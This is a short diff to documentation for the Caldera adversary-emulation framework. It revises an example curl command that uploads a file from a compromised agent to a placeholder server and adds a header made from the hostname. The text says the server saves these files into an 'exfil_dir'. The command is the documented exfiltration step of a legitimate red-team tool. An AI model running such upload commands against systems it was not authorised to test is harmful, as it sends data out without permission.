@@ -6,7 +6,7 @@ After completing an operation a user may want to review the data retrieved from 
 
 Some abilities will transfer files from the agent to the Caldera server. This can be done manually with 
 ```yaml
-curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
+curl -X POST -F 'data=@/file/path/' --header "X-Request-Id:`hostname`-#{paw}" http://server_ip:8888/file/upload
 ```
 Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
 These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.md#configuration-file). By default it is set to `/tmp/caldera`.
